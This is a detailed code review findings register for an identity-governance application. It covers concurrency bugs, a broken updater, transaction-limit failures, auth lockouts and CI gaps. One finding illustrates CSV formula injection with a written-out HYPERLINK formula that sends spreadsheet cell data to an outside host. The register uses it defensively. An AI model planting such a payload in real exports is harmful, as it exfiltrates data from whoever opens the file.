# Full Code Review — Findings Register

**Status:** complete; remediation planned in `docs/superpowers/plans/2026-08-24-remediation-*.md`
**Date:** 2026-08-24
**Reviewed at:** `a60c8a2` on `main`
**Method:** ten parallel reviews — one deep pass over the update feature, nine subsystem passes — each verifying findings against callers and callees before reporting. Build and test gates run end to end.

---

## 1. The state of the tree

Everything builds. Not everything works.

| Gate | Result |
|---|---|
| `tsc -b --force`, all 8 project references | pass, 16 s |
| `vite build`, production web bundle | pass, 206 modules |
| Prisma schema vs. 31 migrations, replayed on a shadow database | no drift |
| `ops/syntra-update.test.sh` | 24 / 24 |
| Full vitest suite, 4 workers | **3530 / 3530** after three test-only fixes |
| Web component suite (`apps/web`, jsdom) | 301 / 301 |

The suite had never completed a run before this review — two prior attempts were killed at three hours and cancelled. Three tests were therefore sitting red on `main` unseen. They are fixed (§2) and the suite now runs clean twice.

**80 findings: 1 critical, 22 high, 33 medium, 24 low.**

The defects below are invisible to the suite because in every case the code does what its own tests assert and fails at a seam no test crosses.

---

## 2. The three tests that were committed red

Fixed during the review. Test-only; no product code changed.

**R1 — A spy on Prisma's Proxy poisoned every later test in the file.**
`prisma` is a Proxy that materialises methods on access. `vi.spyOn(prisma, '$queryRawUnsafe')` restored to `undefined` rather than to the original, so the two tests after it failed with `$queryRawUnsafe is not a function` in the database and migrations probes. Now swapped by hand with a `finally` restore.
`packages/core/src/health/readiness.test.ts`

**R2 — A test that could never pass on a development checkout.**
"Says so when no token is configured" asserted on the token refusal, but in a checkout `buildInfo()` reports `dev`, so the working-tree refusal returns first and the token branch is unreachable. The test now arranges a release install via a `buildInfo` spy.
`packages/core/src/update/update-service.test.ts`

**R3 — A stale assertion left by the write-back copy change.**
The console now names the owning source and the setting; the test still expected the old `managed by a directory source` string. Nobody saw it fail because CI never runs this file (§8.1).
`apps/web/src/pages/admin/StatusToggle.test.tsx`

---

## 3. Critical

### C1 — One person with two `User` rows stops every directory snapshot, permanently

`collect` emits one `CollectedHolding` per `(userId, resource)` but keys the subject on `user.personId`. `Holding` is unique on `(snapshotId, subjectKey, systemId, resourceKind, resourceId)`, and `buildSnapshot` writes with `createMany` — no `skipDuplicates`, and no de-duplication of `prepared`.

Two `User` rows for one person is an explicitly supported shape (§6 of the sync design: "one person may hold several `User` rows"). The moment both are members of the same group, sit under the same org unit carrying an application assignment, or hold the same role, collect produces two identical holdings for `person:<id>`, `createMany` raises P2002, the catch marks the snapshot `failed` and rethrows.

**Every subsequent nightly build fails identically.** Snapshots stop; sources go stale; past `maxSnapshotAgeDays` every campaign start and every revocation batch is refused. Governance halts and does not restart on its own.

`packages/core/src/govern/collect.ts:317-470` → `packages/core/src/govern/snapshot-service.ts:305`

---

## 4. Data loss

### D1 — `pnpm db:reset` will truncate the lab database

`reset.ts` refuses only when `NODE_ENV === 'production'`, then `TRUNCATE … CASCADE`s every table `DATABASE_URL` points at. **`NODE_ENV` is set nowhere in the lab deployment** — verified: not in `docs/lab/systemd/syntra.service`, not in `.env.example`, not in `packages/db/.env.example`. The guard tests a variable nobody sets rather than anything about the database itself.

`e2e/README.md` instructs operators to run `pnpm db:reset && pnpm seed` as a habit, and the lab host uses the same checkout layout at `/root/syntra`. Every tenant, audit chain and grant record is one command away.

Compounding it: the dev database and the lab database are **both named `syntra`**, so no name-based rule can tell them apart. The guard has to be refuse-by-default with a deliberate, typed opt-in.

`packages/db/src/reset.ts:15`

---

## 5. The update feature cannot install a release

Four independent blockers, each alone sufficient to end an update in a rollback. From the deep review of `5f63f3e..HEAD`; 15 findings confirmed, 1 plausible.

**U1 — No `DATABASE_URL` at the migrate step.** `prisma migrate deploy` runs inside the unpacked release, where `packages/db/.env` is the only file the Prisma CLI reads `DATABASE_URL` from — and that file is gitignored, so it is never in the tarball. Only the root `.env` is symlinked. Every console update fails at `migrating` and rolls back. `ops/syntra-update:229`

**U2 — No Prisma client on the target.** The updater runs `pnpm install --frozen-lockfile` but never `db:generate`; `node_modules` is excluded from the tarball and `@prisma/client`'s postinstall cannot find `packages/db/prisma/schema.prisma` from the release root. The new release boots, the first query throws `@prisma/client did not initialize yet`, readiness stays 503 for 90 s, and the rollback discards any writes made in the meantime. `ops/syntra-update:220`

**U3 — Nobody holds `deployment.manage`.** It was added to the catalog, but `Role.permissions` is a stored snapshot written only by the seed, which exits early on an already-seeded database. There is no migration, no backfill and no role-editing API. Existing installs get 403 and the Updates page is hidden; the only remedy is hand-written SQL. `packages/core/src/rbac/permissions.ts:26`

**U4 — A converted install is `dev` forever.** `syntra-install` creates `releases/dev` with no `RELEASE.json`; both the updater and `checkForUpdate` refuse `dev`, and `deploy.sh` never writes one. There is no path from the only deployment that exists to a first console update. The README's claim that the updater "notices a modified tree and refuses" is also false — only `RELEASE.json` presence is checked. `ops/syntra-update:189`

**U5 — Rollback leaves the new release's schema objects behind.** `pg_restore --clean --if-exists` drops only objects present in the archive, so tables, types, indexes and policies created by the new migration survive while its `_prisma_migrations` row is removed. The next attempt fails at `migrating` with `relation "X" already exists`, and repeats until someone drops objects by hand. The console's "Nothing was left half-applied" message is untrue. `ops/syntra-update:166`

**U6 — Hard-coded environment.** `READY_URL` (`127.0.0.1:3000`), the Postgres container name (`infra-postgres-1`) and the `pg_dump` role/database (`syntra`/`syntra`) are fixed in the script, while `launchUpdater` forwards only token/root/repo. A deployment with a different `PORT` — a real, validated config key — has its healthy new release judged broken and rolled back, and the rollback's own readiness check fails the same way. `ops/syntra-update:34`

**U7 — `syntra-install` never rewrites `WEB_ROOT`.** It copies `.env` verbatim and rewrites only `WorkingDirectory` and `--env-file-if-exists`. An absolute `WEB_ROOT` keeps serving the old `/root/syntra` bundle forever while `probeWeb` passes; a relative one resolves against the new cwd and breaks readiness, so every update rolls back. `ops/syntra-install:85`

**U8 — `sort -V` misorders `dev` and `.partial`.** `previous_release()` and `releases_to_prune()` sort the literal `dev` and any `<v>.partial` directory *after* real versions, so a rollback can target the unversioned copied tree or a half-unpacked directory, and `dev` is never pruned. `ops/syntra-update:101`

**U9 — `/health/ready` is unauthenticated, unrate-limited and chatty.** `rateLimit` is registered `global: false` and this route sets no config, yet each hit runs several queries, two `withTenant` transactions and an AES unseal. When Postgres is down the body includes Prisma's `Can't reach database server at 'host:5432'`, contradicting the comment that it discloses nothing a sign-in attempt would not. `apps/api/src/app.ts:140`

**U10 — The Updates page tears down its own polling.** After a 202 it calls `load(true)` immediately; that succeeds (the API is still up), clears `restarting`, and if the status file has not been written yet the page decides nothing is running and clears the interval for good. The page then sits static with the button re-enabled while the update restarts the server; a second click launches a second updater that loses the lock and overwrites the status file with `failed`. `apps/web/src/pages/admin/UpdatesPage.tsx:108`

Also confirmed, lower severity: unhandled `spawn` error in `launchUpdater` (API crash when `systemd-run` is missing); the lock-loser's `die` overwriting the live `update.status`; `workflow_dispatch` in `release.yml` verifying branch HEAD rather than the input tag; a reused `verifying` step label; `POST /update` and the 3 s poll each making a GitHub round trip when `/update/status` exists; and a bare `fetch` bypassing `guardedFetch`.

---

## 6. Governance

### 6.1 Campaigns, reviews, revocations

**G1 (high) — Two reviewers can both decide one item.** `findUniqueOrThrow` → check `status === 'pending'` → `create` decision → `update` status, with no row lock, no conditional update, and no unique index on `CampaignDecision(itemId)`. Under `quorum: 'any'` — normal for a role or group selector, and true of every escalated item — both reviewers commit. One item carries both a certify and a revoke; `HoldingCertification` can say "certified" for an item heading into a revocation batch. `closeDueCampaigns` breaks the tie on `decidedAt`, which is identical within a second. `decision-service.ts:314`

**G2 (high) — Retention deletes the evidence a campaign was signed against.** The docstring promises that a snapshot referenced by *a campaign*, an evidence bundle or an open finding is never pruned; the code checks only `EvidencePack` and `GovernFinding`. `Campaign.snapshotId`, `Campaign.rebasedFromSnapshotId` and `CampaignItem.holdingSnapshotId` are bare uuid columns with no foreign key, so nothing stops it at the database either. `snapshot-service.ts:643-687`

**G3 (high) — The `revoked` figure counts items that were not revoked.** Computed as "items whose latest decision is `revoke`", which includes `revocation_requires_change`, `revocation_failed` and items still in `revoke_decided`. §10/§13 define "revoked" as applied at the system that holds it. `reviewer-service.ts:884-905`

**G4 (high) — Reviewer escalation dies at the transaction ceiling and never recovers.** Reminders batch by reviewer (200), but inside the batch transaction the escalation block loops over every pending item that reviewer holds, issuing a `findFirst` plus a `create` per (item, approver) — bounded by campaign size, not by any batch constant. A 20k-item campaign over 50 reviewers issues ~40,000 sequential statements, blows the 5,000 ms ceiling, and rolls back the `lastRemindedAt` writes with it, so the next run rebuilds the identical batch and fails identically. **No reminder and no escalation ever goes out.** The budget test misses it because its seeded reviewers have no `managerPersonId`, so the loop never executes. `reviewer-service.ts:710-736`

**G5 (high) — `rebaseCampaign` is one transaction with an update per item.** §8 rule 2 requires a campaign whose snapshot has aged past `maxSnapshotAgeDays` to be re-based before its revocations can execute, and the guard refuses outright otherwise. A 20k-item campaign hits P2028 partway and rolls back entirely, so re-base is impossible and the batch is permanently unexecutable. Not covered by the budget suite. `campaign-service.ts:677-760`

**G6 (medium) — Re-base ignores item status entirely.** No status filter and no campaign-status check: terminal `undecided` items go back to `pending`; a `revocation_dispatched` item whose removal Provision applied shows as absent and is overwritten to `moot`, erasing the outcome; a re-opened `certified` item keeps a `HoldingCertification` row claiming an attestation nobody made. `campaign-service.ts:699-728`

**G7 (medium) — `bulkCertify` skips the single-item gates.** `recordCampaignDecision` refuses unless the campaign is `open`/`executing` and refuses to certify a departed subject; `bulkCertify` checks neither. A leaver's items are still `pending` until the nightly sweep, so their manager can bulk-certify a departed person's access — which the single path treats as false assurance and refuses. `decision-service.ts:445-500`

**G8 (medium) — `CampaignScope.riskFlags` is accepted, stored and never applied.** In the type, the schema and the public contract, persisted on `Campaign.scope`, and read by nothing. A campaign scoped to risky holdings silently generates items over every holding of those kinds — and `previewCampaignScope` uses the same unfiltered function, so the preview agrees with the wrong reality. `campaign-service.ts:30,43,137-280`

**G9 (medium) — Items are generated over `state: 'unknown'` holdings.** `holdingsInScope` does not filter on state, unlike the revocation paths, and `CampaignItem` carries no state column — so an absent fact is indistinguishable from a real holding on the reviewer's screen and gets certified as held. `campaign-service.ts:145-152`

**G10 (medium) — "Last certified" is always blank.** `projectCertification` writes `subjectRefId` as the bare person id or account ref; the portal queries and keys its map on `subjectKey` (`person:<uuid>`). Every item reads as never certified, pushing reviewers to re-attest blind. `report-service.ts` and `snapshot-service.ts` build the key correctly, so the reader is the wrong side. `apps/api/src/routes/govern-portal.ts:125-156`

**G11 (medium) — Laundering detection is O(decisions² × rules).** For each SoD rule it iterates every decision edge against every other with the pair filter inside the inner loop. 10,000 decisions and 20 rules is ~2×10⁹ iterations on the nightly job, blocking the event loop and starving every other job, whether or not any laundering exists. `graph.ts:150-183`

**G12 (medium) — The gain/audit cross-reference updates per row inside one transaction.** After a bulk provisioning run the per-row updates exceed the ceiling, `buildSnapshot`'s catch marks the whole snapshot `failed`, and the night's holdings, findings and diff are lost — on exactly the day the change report matters most. `snapshot-service.ts:410-455`

**G13 (low) — Unreachable states and dead gates.** `Campaign.status = 'executing'` is never written (and `closeDueCampaigns` only closes `open`, so anything that set it would never close); `opensAt` gates nothing, so a campaign scheduled for next month is live the moment it starts; `extendCampaign` does not check status, so a closed campaign's due date can be moved and its reviewers re-notified.

**G14 (low) — Orphan-account holdings are dropped.** `collect` skips any user whose `personId` is null for groups, applications and roles. §6 says an orphan account's holdings are holdings, held by somebody Syntra cannot name. A service account holding `tenant.manage` produces a `subject_unresolvable` gap but no `syntraRole` holding, so it appears in no report and no campaign. `collect.ts:311,331,445,458`

**G15 (design gap) — Nothing computes a revocation batch at campaign close.** §13 says revoke decisions are computed into a batch at close or at an explicit action before it. `closeDueCampaigns` never calls `computeRevocationBatch` and no job does. A campaign closes with its revoke decisions sitting untouched forever unless an administrator triggers it by hand. `reviewer-service.ts:776`

**G16 (design gap) — `revocation_order` resolves the target account by `findFirstOrThrow`** on `{ targetSystemId, personId? }`. Safe only because of a current uniqueness that nothing states here; the item already carries `accountRef`. `revocation-service.ts:625`

**G17 (design gap) — `recordCampaignDecision` permits `blocked_no_reviewer → certified`**, which `CERTIFYING_TRANSITIONS` says does not exist. Unreachable today only because a blocked item has no active reviewer row. `decision-service.ts:238,316`

### 6.2 SoD, findings, evidence, reporting

**G18 (high) — The evidence bundle is structurally empty.** `createEvidencePack` accepts a `campaignId`, stores it on the row, and never reads it. Items, decisions, reviewers, notifications and dispatches are hard-coded `[]`. The digest is computed over the empty document, so **it verifies perfectly** — while the printed cover asserts "an item marked `undecided` in this bundle was NOT attested", a statement about items the bundle does not contain. An auditor receives a signed, digest-verified artifact with zero decisions and nothing saying its content is missing. `export-service.ts:199-203`

**G19 (high) — CSV export has no formula-injection guard.** `escape` quotes only on `"`, `\n` and `,`; a cell beginning `=`, `+`, `-`, `@`, tab or CR is written verbatim, and quoting would not neutralise it anyway. Every value originates in directory or target data — which a *target* administrator controls, not a Syntra one. A group named `=HYPERLINK("http://x/?"&A2,"click")` executes when an auditor opens the export. The regex also omits `\r`, so a lone CR splits a row. `export-service.ts:39`

**G20 (high) — Clearing the snapshot cadence unschedules six unrelated jobs.** `applyGovernSchedules` treats `snapshotSchedule === null` as "unschedule every purpose". Pausing snapshots — a documented operation — also stops `govern.audit.verify` (so a broken hash chain is never detected), `govern.exception.sweep` (so an approved exception stays `active` past its `endsAt` forever and its violation stays `excepted`, invisible on the default `open` filter), campaign close and reminders. Exception expiry is enforced *only* by the sweep this switch turns off. `jobs.ts:334`

**G21 (high) — "Verify now" raises a false critical alarm and downgrades the checkpoint.** The route calls `verifyIncremental(tenantId)` with no options, so `signer` defaults to `null` while the scheduler passes a real one built from `GOVERN_CHECKPOINT_KEY`. `checkpointTrust` returns `unknown_key` for a legitimately signed checkpoint, the result is forced to `broken`, a `critical` `audit_chain_broken` finding is raised and mailed, a full genesis walk runs inside the HTTP request, and the recovery branch rewrites the head checkpoint **unsigned** — so that night's scheduled run refuses to seed and walks from genesis again. `apps/api/src/routes/admin/govern.ts:599-603` → `audit-integrity.ts:226,400-410`

**G22 (medium) — Four sweeps and reports exceed the transaction ceiling.** Each wraps a per-row loop in one `withTenant`, several with a per-row `recordEvent` that takes a per-tenant advisory lock:
- `sweepExceptions` / `lapse` — `exception-service.ts:359-427,437`
- `detectDecisionGraph` — loads all decisions, all grants and the full snapshot holdings in one transaction — `sod-service.ts:625-782`
- `sweepAcceptedFindings` — `finding-service.ts:566-597`
- `whoHasAccessToSystem` — unbounded `person` and `contract` reads; `whatChanged` reads a whole quarter of audit events and returns them all — `report-service.ts:150-156,527-537`

The first three run inside `runSnapshotJob`, *after* earlier stages have committed, so an abort retries the whole job and builds a second snapshot. None is covered by the budget suite.

**G23 (medium) — SoD violation detection reads-then-creates.** One transaction per violation doing `findUnique` then `create`, with no upsert and no `singletonKey` on the queue. A manual snapshot overlapping the nightly one raises P2002; the job throws and `reconcileFindings` never runs, while rows for earlier persons are already committed. `sod-service.ts:255-284`

**G24 (low) — A refused risk acceptance routes the remediation to the beneficiary.** §14 says the item goes to the rule owner and the approver who allowed the grant; the code sets `ownerPersonId: exception.personId` — the person the control exists to constrain. The rule owner is never told there is work to do. `exception-service.ts:287-297`

**G25 (low) — Refused exports are not audited.** `exportReportCsv` throws on a live report before any `recordEvent`, while the successful path is audited. Repeated refused attempts leave no trace. `export-service.ts:60-64`

**G26 (low) — `verifyFull` and `revokeSodException` are exported, tested and reachable from nothing.** §17 requires from-genesis verification as an explicitly invoked paged job; §15 requires early revocation of an exception by an approver or the rule owner. Neither has a route or a job registration. `audit-integrity.ts:485`, `exception-service.ts:319`

**G27 (design gap) — SoD rule and evaluation edges.** Two different functions may name the same resource, so one holding lands on both sides and a person holding a single resource is reported in violation. Laundering matching keys on `resourceId` alone, dropping system and resource kind, so two resources sharing an id in different systems match. `state: 'unknown'` holdings are filtered out of `loadSodFacts` entirely. The exception warning is edge-triggered on an exact day count, so a skipped sweep loses the warning silently. `EvidencePack.storageRef` is never written, so a bundle cannot be re-fetched and re-creating it yields a different digest.

---

## 7. Approvals, provisioning, sync, auth, API, console

### 7.1 Access requests and approvals

**A1 (high) — An admin-unblocked multi-stage request sticks forever.** After an administrative approval of a `blocked_no_approver` request, when a next stage exists and opens, the code enqueues stage-opened mail and returns `pending_approval` — but never writes the status. On the normal path the row is already `pending_approval`, so the omission is invisible; on the admin path the request stays `blocked_no_approver`, so stage-2 approvers are emailed and then refused `not-open`. Only single-stage blocked requests are tested. `decision-service.ts:385-421`

**A2 (high) — Terminal transitions are read-then-write.** `recordDecision` and `cancelRequest` check `request.status` with a plain read then update by id with no predicate, under READ COMMITTED. A concurrent reject lands after an approval has already fulfilled: a live, applied grant under a request whose record says `rejected`, contradictory decision rows, and both notification sets sent. `decision-service.ts:82-111,286-299,427-430,479-497`

**A3 (medium) — A request that becomes blocked mid-flight notifies nobody.** When stage N≥2 resolves to nobody, the request is set `blocked_no_approver` and returns — no outbox rows for the product owner or `automate.manage` holders, no audit event. The stage-1 path in `submitRequest` does send both. `decision-service.ts:385-395`

**A4 (medium) — `scheduled` grants are unreachable and the pre-hire path is dead code.** `grantWindow` can only return `scheduled` when `requestedStartsAt` is future (hard-coded `null`; the requester-chosen start date exists in the design and nowhere in the code) or when the subject has zero active contracts — but every route to fulfilment requires one. So nothing writes `status: 'scheduled'`, and the tick job's promotion pass, the `LIVE_GRANT_STATUSES` member and Provision's handling all service a status that cannot occur. `fulfil.ts:298-312`, `eligibility.ts:39-46`

**A5 (medium) — Delegated capability and audience checks pick an arbitrary row.** `delegationFor` takes `.find()` over an unordered `findMany` and reads the capability and `audienceCondition` from that row alone, though multiple delegations per (resource, delegate) are legal. `delegatedGrant` takes the bounding audience from `productGrant.findFirst` with no ordering, and falls back to the delegation's own condition when the first-found product is draft or retired even though an active one with a condition exists. `delegation-service.ts:392-403,476-485`

**A6 (medium) — Swept entitlement revocations are never confirmed.** The sweep marks them `dispatched`, counts them in `applied`, closes the sweep `applied`, marks the grant `expired` and mails the holder — and nothing ever moves a `SweepAction` to `applied`/`failed`. A revocation Provision fails is invisible: the console says the access ended while the target still holds it. `sweep-service.ts:701-709,826-839`

**A7 (low) — Lazy stage re-resolution drops escalation approvers and restarts the SLA.** `openStage` deletes all `ApprovalStepApprover` rows including `via: 'escalation'`, which the resolver never re-adds while `escalatedAt` stays set, and resets `openedAt`/`slaDueAt`. The design's reassignment notifications do not exist on this path. `decision-service.ts:184-195`

**A8 (low) — Reflection stamps `fulfilledAt` on failed requests**, unlike `fulfilRequest`, which sets it only for fulfilled and partially fulfilled. `reflect.ts:233-236`

**A9 (low) — Outbox send is at-least-once** with a whole-batch duplicate window between the send phase and the marking phase.

### 7.2 Provisioning

**P1 (high) — A reviewer's revocation order can be silently dropped forever.** Orders are marked `planned` when the plan is *written*, not applied. Nothing writes `applied` (the status and `appliedAt` column have no writer) and nothing reverts `planned → open` when the run dies; `loadRevocationOrders` reads only `open`. If the run is blocked by the guard, superseded, or the action fails, the order never re-enters any later plan — while the audit trail shows an order that looks handled. `run-service.ts:1289`, `revocation-service.ts:1081`

**P2 (medium) — No concurrency guard on apply.** The `previewed/blocked → applying` transition is a plain update after a read. Two concurrent applies both proceed: process A creates the account with password A and delivers it; process B adopts the same object via its provenance marker, then seals password B into the same vault name and mails password B. The directory holds A. `apply.ts:468-527`

**P3 (medium) — The deactivation guard's denominator is tenant-wide,** not "active Syntra users linked to this target" as §11 defines it — so 100% of one target's linked logins can compute as 2% and sail through unconfirmed. `run-service.ts:657-671,1009`

**P4 (low) — Every pre-hire generates a false `unexpected_status` drift finding on every run** until their start date, because `finish` records the created-disabled account as `active`. Ten hires two weeks out means ten open findings for two weeks, training administrators to ignore the drift tab. `apply.ts:1137-1157`

**P5 (low) — Creating a business rule never verifies the target.** The update path checks it; the create path relies on the FK, which bypasses RLS. A typo gives a bare 500; a valid other-tenant id stores an inert cross-tenant row. `target-service.ts:995-1036`

**P6 (low) — `pending_retry` actions are never superseded,** contradicting §14, and belong to a terminal `partially_applied` run that can never be re-applied — so they read "will be retried" forever. `run-service.ts:122-125`

**P7 (low) — Deleting a target orphans its sealed initial passwords.** Only `target/{id}/bind` is removed; the per-account `target/{id}/initial/{accountId}` entries become unreachable live credentials with no owner and no reader — exactly what the function's own comment warns about for the bind secret. `target-service.ts:590`

**P8 (design gap) — Bounded write concurrency (§14, default 4) is not implemented;** `TargetSystem.concurrency` is stored and validated with no reader. `ProvisionAction` status `'skipped'` is unreachable. `nextAttemptAt`, `disableDueAt` and `archiveDueAt` are never read or written.

### 7.3 Directory sync, connectors, protocols

**S1 (medium) — Correlation ignores the configured correlation key.** `loadExisting` sets every existing user's `correlationValue` to `u.login` unconditionally, while the object side uses whichever mapping is marked `isCorrelation` — which `setMappings` and the contract allow to be `email` or `displayName`. Configure correlation on email and the intended `conflict` never fires: a duplicate account is created for the same person, and a source email equal to someone's login reports a spurious conflict. `run-service.ts:489`

**S2 (medium) — "Test connection" fails against any real directory.** `test()` runs unpaged searches with no client `sizeLimit`; ldapts throws `SizeLimitExceededError` on result code 4 unless one was set. AD's default `MaxPageSize` is 1000 and OpenLDAP's default is 500, so a perfectly good configuration reports failure and audits `connection-failed`. `discoverSchema` is unaffected because it passes `sizeLimit: 20`. `ldap/connector.ts:226-241`, `ad/connector.ts`

**S3 (low) — A run queued for a disabled source stays `queued` forever.** Neither the route nor `queueRun` checks `enabled`, and `runSyncJob` early-returns without touching the run row. Nothing reaps `queued`. The page follows the run and spins indefinitely with no error recorded. `apps/api/src/routes/admin/sources.ts:233-259`, `sync/jobs.ts:132-139`

**S4 (low) — Write-back reports an unreachable host as "the directory refused the new password".** `classify()` defaults unmatched errors to `policy`, and DNS and TLS failures match nothing on the list — so a user iterates on ever-stronger passwords against an outage and the audit says `directory_policy`. `ldap/writeback.ts:61-89`

**S5 (low) — `/health/ready` has no timeout of its own.** A database that accepts TCP and stops answering hangs the readiness gate the updater's rollback decision waits on. `health/readiness.ts:67-73`

**S6 (low) — `POST /sources/:id/test` is not audited,** while `/sources/test` is. `apps/api/src/routes/admin/sources.ts:217-231`

**S7 (design gap) — Provision run is not enqueued after an admin deactivation** (write-back design §7.2 step 6); the ladder starts only at the next scheduled run. **`auth.password_writeback_desync` is not implemented** (§9): a commit failure after the directory accepted propagates as a plain 500 with no marker to find it by.

### 7.4 Authentication and RBAC

**H1 (high) — A passkey-only user can never complete a password reset.** Found independently by two reviewers. `completePasswordReset` demands a factor when one is enrolled and verifies WebAuthn against a challenge of purpose `authenticate`; the only endpoint that mints one requires a live `AuthAttempt` token, and the reset flow holds a `PasswordResetToken`. `findAttempt` always misses and the route answers 401. The web client confirms it: `ResetPassword.tsx` posts the reset token as `attemptToken`. A user whose only factor is a passkey, with no recovery codes left, is hard-locked out. Fails closed — a lockout, not a hole. `apps/api/src/routes/mfa.ts:224-235`, `packages/core/src/auth/password-reset.ts:334-358`, `apps/web/src/pages/ResetPassword.tsx:57`

**Widened after the review closed.** The admin-minted password setup link that landed in `95ea0d5..4a8a12a` mints its token through `issuePasswordSetup` (`password-reset.ts:250`) and completes it through the *same* `completePasswordReset`, which demands a factor via `acceptableFactorsFor`. The new feature inherits this exactly: an administrator can mint a setup link for a user who already holds a passkey, hand it over, and it can never be completed. That raises H1 from an unlucky reset to a documented onboarding path that does not work, and it should be fixed before the setup-link feature is relied on.

**H2 (medium) — Role permissions are frozen at seed time and there is no role API at all.** The Owner role is written once with the catalog as of seeding; the catalog grew in six later commits and no migration ever updates `Role.permissions`. `createRole`, `assignRole`, `revokeRole` and `listRoles` have no callers outside seed and tests, so `rbac.manage` and `secrets.write` gate nothing and `isPermission` is never called. An upgraded deployment's Owner gets 403 on every new module with no path to grant it but raw SQL. This is the general case of U3. `packages/db/src/seed.ts:81-85`, `rbac-service.ts`

**H3 (medium) — No self-service TOTP removal.** `POST /mfa/totp/begin` refuses with "Remove the existing one before setting up another", but no route and no screen can; only the admin-gated `DELETE /admin/users/:id/factors/totp` exists. Replacing a phone requires an administrator. `apps/api/src/routes/mfa.ts:283-302`

**H4 (low) — Cookie security is keyed off `NODE_ENV`, not configuration.** The session cookie's `secure` flag and the federation binding cookie's `SameSite=None; Secure` pair both read `process.env.NODE_ENV === 'production'`, which `config.ts` has no say in. Running behind TLS without exporting it sends session tokens without `Secure` and falls the binding cookie back to `Lax` — which the file's own comment says breaks every cross-site federation POST — with no configuration error anywhere. `session-reply.ts:20-25`, `federation.ts:134-148`

**H5 (low) — Passkey removal needs only a session and notifies nobody.** No current password, no step-up, and it cascades recovery-code revocation — while factor *additions* deliberately mail the owner as one of the two controls that make the enrolment trade acceptable. `apps/api/src/routes/mfa.ts:397-427`

**H6 (low) — Five dead exports:** `hasPassword`, `listSecretNames`, `matchesIpRanges`, `matchesTimeWindow`, `isPermission`.

### 7.5 API surface

**N1 (high) — SAML `ForceAuthn` loops until the request expires.** `completeSso` redirects to `/login` whenever `!session || ctx.parked.forceAuthn`. Nothing clears the flag: `findParkedAuthnRequest` returns it unchanged, `consumeParkedAuthnRequest` only stamps `consumedAt` and runs after the check, and no re-authentication marker exists on the row or the session. The login page returns the browser to `/saml/continue?handle=…`, the same condition fires, and the user re-authenticates in a loop — minting a fresh session each round — until the row expires at ten minutes with a 410. No assertion is ever issued; no test covers `forceAuthn`. `apps/api/src/routes/saml-idp.ts:665`

**N2 (medium) — The admin decide route skips schema validation.** The body is cast, not parsed with `decideRequestBody`, and `recordDecision` only branches on `=== 'reject'` — so `{"decision":"Reject"}` capitalised **approves** the request, skips the comment-required guard, fulfils the grants, and writes the literal string into the decision row and the audit payload. A missing field reaches Prisma as `undefined` → 500. `/automate/grants/:id/revoke` is likewise uncast. `apps/api/src/routes/admin/automate.ts:240,413`

**N3 (medium) — Govern preview endpoints ignore org-unit scoping.** Three POST routes are guarded by `requireGovernRead()` alone with no scope filter, unlike every GET beside them, and return tenant-wide holdings, person counts and subject-key samples. They are absent from the structural list that enforces §21 scoping on every read path, so no test sees them. `apps/api/src/routes/admin/govern.ts:693,702,897`

**N4 (medium) — Changing a tenant's domain leaves a stale cached OIDC issuer.** `providerFor` caches one provider per tenant with the issuer fixed at construction; `invalidateProvider` is called on client changes and key rotation but not by `PUT /api/admin/tenant`, which is the route that changes `primaryDomain`. Every token keeps the old `iss` until a restart or an unrelated rotation. `apps/api/src/routes/admin/tenant.ts:113`

**N5 (low) — Malformed UUIDs surface as 500s** on four routes that skip `idParam`, including the unauthenticated `GET /saml/metadata/:applicationId`. `saml-idp.ts:382-384`, `admin/govern.ts:355,939`, `automate-portal.ts:98-104`

**N6 (low) — The token endpoint 500s on malformed percent-encoding** in Basic credentials instead of answering `invalid_client`. `oidc-token.ts`

### 7.6 Console

**W1 (high) — The product editor never loads the product it edits.** The route renders in edit mode but nothing fetches the product; the only fetch is the list, whose data is unused. All fields start empty and `save()` issues a full `PUT` requiring the whole object — so "fixing a typo" replaces description, category, grants, form schema and duration mode with the editor's defaults. `ProductEditorPage.tsx:14-27,84-89`

**W2 (medium) — Bulk certify silently drops other campaigns' selections.** The list spans every open campaign and any bulk-enabled item gets a checkbox, but the request always sends `items[0].campaign.id`; `bulkCertify` filters on it, so ids from other campaigns are neither certified nor listed in `refused` — they vanish, the selection clears, and nothing is reported. The bulk button also renders only when `items[0]` happens to belong to a bulk-enabled campaign. `MyReviewsPage.tsx:123-158,213-227`

**W3 (medium) — Nothing handles a 401 mid-session.** `GENERIC` maps only 403 and 404, and nothing clears the session or navigates to `/login`. An expired admin session — the deliberately short one — turns every panel into "Something went wrong" with no route back. `use-api-resource.ts:35-38`

**W4 (medium) — The reports "Live" toggle is wired to nothing.** Mode state is kept and a caveat rendered, but the URL is always the snapshot one and the contract has no mode parameter. The admin reads a snapshot believing it is live. `GovernReportsPage.tsx:81-119`

**W5 (medium) — Assignment controls swallow every failure and are shown to callers the API refuses.** `assign()`/`unassign()` have no error handling, so a 403 for a holder of `access.read` is an unhandled rejection and the button appears to do nothing. Same shape on `PoliciesPage` move/remove and `Security.removeKey`. `ApplicationDetailPage.tsx:70-86`

**W6 (medium) — Server features with no way to invoke them.** Campaign creation, start, re-base and previews — so the whole access-review module is inert from the console, while its empty state tells the reader to create one. Also: workflows (no list route at all, so a product's required `workflowId` cannot be discovered), person link-user, admin factor removal, group membership, application update/retire, policy default and rule edit, automate settings, several govern settings and reports, admin and portal delegations, and grant extension — which links to the plain request form and never sends `replacesGrantId`, so an "extension" is a second parallel grant.

**W7 (low) — Review decide buttons have no in-flight guard;** a double-click double-submits a revoke. `MyReviewsPage.tsx:58-84`

**W8 (low) — Orphan "Confirm" calls a server stub that always throws 501.** `GovernOrphansPage.tsx:56-82`, `admin/govern.ts:560-578`

**W9 (low) — Removing a security key discards the `recoveryCodesRevoked` response,** so the user is never told their printed codes just stopped working. `Security.tsx:97-100`

---

## 8. What CI cannot see

**X1 (high) — 71 web component tests run in no CI job at all.** The root vitest config includes only `*.test.ts`, so every `apps/web/**/*.test.tsx` file is invisible to `pnpm test`, and no job runs `pnpm --filter @syntra/web test`. Because `release.yml` reuses `ci.yml` via `workflow_call`, **tagged releases ship with these tests unexecuted too**. R3 is the proof: a stale assertion sat red on `main` unnoticed.

Worse, the three web `.test.ts` files CI *does* match run under the root config — node environment, without `apps/web/src/test-setup.ts` — not the jsdom config they were written for. `vitest.config.ts:33`

**X2 (medium) — The production web bundle is never built by CI.** No job runs `vite build`; the browser suite exercises the Vite dev server. A build-only break merges green and first fails in `release.yml`, or on the lab host mid-deploy.

